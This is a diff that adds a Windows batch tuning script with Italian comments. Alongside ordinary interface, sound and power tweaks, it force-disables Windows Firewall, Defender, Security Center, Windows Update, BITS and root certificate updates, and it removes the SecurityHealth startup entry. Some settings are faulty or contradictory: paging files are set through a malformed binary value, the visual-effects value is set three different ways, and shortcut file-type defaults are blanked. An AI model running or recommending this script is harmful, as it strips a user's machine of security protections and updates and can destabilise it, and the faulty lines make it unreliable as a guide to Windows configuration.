+:: Mostra tutte le icone nella taskbar (overflow)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v EnableAutoTray /t REG_DWORD /d 0 /f
+
+:: Nascondi automaticamente la taskbar
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v Settings /t REG_BINARY /f /d 3000000003000000feffffff000000000000000000000000000000000000000000000000000000000000000001000000
+
+::echo Impostazione AutoHide per la barra delle applicazioni...
+::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v "Settings" /t REG_BINARY /d "30000000feffffff7af400000300000030000000300000000000000000040000800700001e050000" /f
+
+::echo Applicazione delle impostazioni...
+::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAutoHideInTabletMode" /t REG_DWORD /d "1" /f
+
+
+:: Riavvia explorer per applicare modifiche
+taskkill /f /im explorer.exe
+start explorer.exe
+
+:: Mostra posizione del cursore con CTRL
+reg add "HKCU\Control Panel\Mouse" /v Sonar /t REG_SZ /d 1 /f
+
+
+:: Imposta cursore mouse su "molto grande invertito"
+(
+    echo Windows Registry Editor Version 5.00
+    echo.
+    echo [HKEY_CURRENT_USER\Control Panel\Cursors]
+    echo "Scheme Source"="2"
+    echo "Scheme Name"="Windows Invertito (molto grande)"
+) > "%temp%\cursor.reg"
+reg import "%temp%\cursor.reg"
+del "%temp%\cursor.reg"
+
+:: Disabilita AutoPlay
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" /v DisableAutoplay /t REG_DWORD /d 1 /f
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f
+
+:: Mostra estensioni file conosciuti
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 0 /f
+
+:: Disattiva file/cartelle recenti in Accesso Rapido
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v ShowRecent /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v ShowFrequent /t REG_DWORD /d 0 /f
+
+:: Nessun suono di sistema
+echo Disattivazione completa dei suoni di sistema...
+
+:: Imposta lo schema su "Nessun suono"
+reg add "HKCU\AppEvents\Schemes" /v "(Default)" /t REG_SZ /d ".None" /f
+reg add "HKCU\AppEvents\Schemes\Names\.None" /ve /t REG_SZ /d "Nessun suono" /f
+
+:: Disattiva manualmente i principali suoni di sistema
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Open\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemHand\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\CriticalBatteryAlarm\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\LowBatteryAlarm\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\ChangeTheme\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Close\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MenuCommand\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemQuestion\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\AppGPFault\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceFail\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Maximize\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemAsterisk\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemExclamation\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Default\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MailBeep\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Minimize\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreUp\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreDown\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\PrintComplete\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\Explorer\EmptyRecycleBin\.Current" /ve /t REG_SZ /d "" /f
+
+reg add "HKCU\AppEvents\Schemes" /v "(Default)" /t REG_SZ /d ".None" /f
+reg add "HKCU\AppEvents\Schemes\Names" /v "(Default)" /t REG_SZ /d "No Sounds" /f
+
+:: Disabilita tutti i suoni più comuni
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Asterisk\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\CriticalBatteryAlarm\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\DefaultBeep\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceFail\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Exclamation\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\ExitWindows\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\HardwareFail\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\LowBatteryAlarm\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MediaConnect\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MediaDisconnect\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MenuCommand\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MenuPopup\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\NewDeviceConnect\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\NotifyCalendar\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\NotifyEmail\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\NotifySMS\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\PopUpBlocked\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\PrinterError\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\Reboot\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreDown\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreUp\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SecurityKeyInsertion\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SecurityKeyRemoval\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemDefault\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemExit\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemHand\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemQuestion\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemStart\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\WindowsBackground\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\WindowsLogoff\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\WindowsLogon\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\WindowsUnlock\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\NFPCompletion\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\NFPConnection\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\UACDisable\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemNotification\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\IMNotification\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\FaxNotify\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SMSNotify\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MailNotify\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\CalendarReminder\.Current" /ve /t REG_SZ /d "" /f
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\MessageBeep\.Current" /ve /t REG_SZ /d "" /f
+
+
+
+echo Tutti i principali suoni di sistema sono stati disattivati.
+
+
+:: Disattiva tasti permanenti (MAIUSC 5 volte)
+reg add "HKCU\Control Panel\Accessibility\StickyKeys" /v Flags /t REG_SZ /d "506" /f
+reg add "HKCU\Control Panel\Accessibility\Keyboard Response" /v Flags /t REG_SZ /d "122" /f
+reg add "HKCU\Control Panel\Accessibility\ToggleKeys" /v Flags /t REG_SZ /d "58" /f
+
+:: Disattiva ibernazione
+powercfg /hibernate off
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v HibernateFileSizePercent /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f
+powercfg /hibernate off
+
+:: Disabilita Remote Assistance (fAllowToGetHelp = 0)
+reg add "HKLM\SYSTEM\ControlSet001\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 0 /f
+
+:: Impostazioni Explorer Advanced (TaskbarAnimations=0, IconsOnly=1, ListviewShadow=0, ListviewAlphaSelect=0)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarAnimations /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v IconsOnly /t REG_DWORD /d 1 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ListviewShadow /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ListviewAlphaSelect /t REG_DWORD /d 0 /f
+
+:: Disabilita Aero Peek (EnableAeroPeek=0)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v EnableAeroPeek /t REG_DWORD /d 0 /f
+
+:: Imposta ShellState (tipo REG_BINARY, valore esadecimale)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v ShellState /t REG_BINARY /d 240000003e280000000000000000000000000001000000130000000000000072000000 /f
+
+:: Impostazione Visual Effects (VisualFXSetting=3)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 3 /f
+
+:: PagingFiles impostato come REG_BINARY con valore a zero (hex(7):00,00,00,00)
+reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v PagingFiles /t REG_BINARY /d 00000000 /f
+
+:: Disabilita trasparenza in Windows (UI effects)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v EnableTransparency /t REG_DWORD /d 0 /f
+
+:: Disabilita animazioni della barra delle applicazioni (TaskbarAnimations=0)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarAnimations /t REG_DWORD /d 0 /f
+
+:: Disabilita animazioni di finestre e menu (VisualFXSetting=2 = "Personalizzato" con animazioni disattivate)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f
+
+:: VisualFXSetting=1 (Regola per prestazioni migliori)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 1 /f
+
+
+REM Imposta profilo prestazioni massime
+powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>&1
+powercfg -change -monitor-timeout-ac 0
+powercfg -change -standby-timeout-ac 0
+
+:: Imposta Prestazioni Elevate
+powercfg /setactive SCHEME_MIN
+
+:: Impedisce disattivazione schermo
+powercfg -change -monitor-timeout-ac 0
+powercfg -change -monitor-timeout-dc 0
+
+:: Disattiva Prefetcher e Superfetch (SysMain)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnableSuperfetch /t REG_DWORD /d 0 /f
+
+:: Disabilita il servizio SysMain (Superfetch) se attivo
+sc stop "SysMain"
+sc config "SysMain" start= disabled
+
+:: Ottimizza lo schermo
+echo Impostazione dimensione caratteri al 115%% e scaling totale al 125%% su Windows 10...
+reg add "HKCU\Control Panel\Desktop" /v LogPixels /t REG_DWORD /d 120 /f
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v AppliedDPI /t REG_DWORD /d 120 /f
+echo Modifiche applicate, per completare è necessario il logout o il riavvio.
+
+:: Disattiva OneDrive dall'avvio automatico per l'utente corrente
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSetup /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDrive /f
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDrive /f
+
+REM Disabilita completamente telemetria per liberare risorse
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f
+schtasks /change /tn "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable 2>&1
+
+
+echo.
+
+echo Disabilitazione di Windows Firewall, Windows Update e Windows Defender...
+
+
+echo Disabilitazione forzata di Windows Firewall, Windows Update e Windows Defender...
+
+:: Disabilita Windows Firewall (tutti i profili)
+netsh advfirewall set allprofiles state off
+
+:: Windows Defender Antivirus
+sc stop WinDefend
+sc config WinDefend start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f
+
+:: Windows Defender Firewall
+sc stop MpsSvc
+sc config MpsSvc start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\MpsSvc" /v Start /t REG_DWORD /d 4 /f
+
+:: Windows Defender Security Center
+sc stop wscsvc
+sc config wscsvc start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\wscsvc" /v Start /t REG_DWORD /d 4 /f
+
+:: Windows Defender Advanced Threat Protection (Evento)
+sc stop sense
+sc config sense start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\sense" /v Start /t REG_DWORD /d 4 /f
+
+:: Windows Update
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f
+net stop wuauserv 2>&1
+sc config wuauserv start= disabled 2>&1
+sc stop wuauserv
+sc config wuauserv start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v Start /t REG_DWORD /d 4 /f
+sc config "wuauserv" start= disabled
+sc stop "wuauserv" 2>&1
+
+:: Background Intelligent Transfer Service (BITS)
+sc stop BITS
+sc config BITS start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\BITS" /v Start /t REG_DWORD /d 4 /f
+
+:: Update Orchestrator Service (UsoSvc)
+sc stop UsoSvc
+sc config UsoSvc start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /v Start /t REG_DWORD /d 4 /f
+
+:: Network Location Awareness (nla)
+sc stop NlaSvc
+sc config NlaSvc start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc" /v Start /t REG_DWORD /d 4 /f
+
+:: Windows Update Medic Service (WaaSMedicSvc)
+sc stop WaaSMedicSvc
+sc config WaaSMedicSvc start= disabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v Start /t REG_DWORD /d 4 /f
+
+:: Disabilita Windows Defender tramite registro
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
+
+:: Blocca aggiornamenti automatici Windows Update tramite registro
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f
+
+
+:: Blocca tramite registro Windows Update automatico
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f
+
+:: Disabilita aggiornamenti tramite Servizi di sistema
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\BITS" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v Start /t REG_DWORD /d 4 /f
+
+echo Operazioni completate. Riavvia il PC per applicare tutte le modifiche.
+
+REM Disabilita indicizzazione per velocità estrema
+sc config "WSearch" start= disabled
+sc stop "WSearch" 2>&1
+fsutil behavior set DisableLastAccess 1
+
+REM Pulisce il registro da voci obsolete
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDrive" /f 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f 2>&1
+
+REM Ottimizzazioni per prestazioni grafiche
+reg add "HKCU\SOFTWARE\Microsoft\DirectDraw" /v EmulationOnly /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Direct3D" /v DisableVidMemVBs /t REG_DWORD /d 0 /f
+
+
+:: Applica tweaks di XPAntiSpy, UWT e WPD con reg add, riga per riga
+
+:: ===== XPAntiSpy =====
+reg add "HKLM\SYSTEM\ControlSet001\services\Schedule" /v Start /t REG_DWORD /d 4 /f
+reg add "HKLM\SYSTEM\ControlSet001\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegDone /t REG_SZ /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v EnableBalloonTips /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Outlook Express" /v "Hide Messenger" /t REG_DWORD /d 2 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Classes\lnkfile" /ve /d "" /f
+reg add "HKLM\SOFTWARE\Classes\piffile" /ve /d "" /f
+reg add "HKLM\SOFTWARE\Classes\SHCmdFile" /ve /d "" /f
+reg add "HKLM\SOFTWARE\Classes\InternetShortcut" /ve /d "" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" /v DisableAutoplay /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v ClearRecentDocsOnExit /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoInternetOpenWith /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsHistory /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v DontReportInfectionInformation /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Classes\Directory\shell\OpenNew" /ve /d "Apri prompt dei comandi qui" /f
+reg add "HKLM\SOFTWARE\Classes\Directory\shell\OpenNew\Command" /ve /d "cmd.exe /k cd %%1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DriverSearching" /v DontSearchWindowsUpdate /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\ControlSet001\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\AuthRoot" /v DisableRootAutoUpdate /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
+
+:: ===== Ultimate Windows Tweaker (UWT) =====
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_LargeMFUIcons /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_TrackProgs /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_MinMFU /t REG_DWORD /d 10 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyComputer /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowNetConn /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowControlPanel /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowSetProgramAccessAndDefaults /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowPrinters /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyDocs /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowDownloads /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v StartMenuFavorites /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyGames /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowHomegroup /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyMusic /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowNetPlaces /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowUser /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowMyPics /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowRecentDocs /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowRecordedTV /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_AdminToolsRoot /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowVideos /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarSizeMove /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarGlomLevel /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarSmallIcons /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v DisablePreviewDesktop /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v NoWindowMinimizingShortcuts /t REG_DWORD /d 1 /f
+reg add "HKCU\Control Panel\Desktop" /v DockMoving /t REG_SZ /d "0" /f
+reg add "HKCU\Control Panel\Desktop" /v HungAppTimeout /t REG_SZ /d "0" /f
+reg add "HKCU\Control Panel\Desktop" /v WaitToKillAppTimeout /t REG_SZ /d "0" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v ShowDriveLettersFirst /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v Link /t REG_BINARY /d 19000000 /f
+
+:: ===== WPD (Windows Privacy Dashboard) =====
+reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v CEIPEnable /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\SQM" /v DisableCustomerImprovementProgram /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Messenger\Client" /v CEIP /t REG_DWORD /d 2 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowSearchToUseLocation /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v DisableUAR /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v DisableInventory /t REG_DWORD /d 1 /f
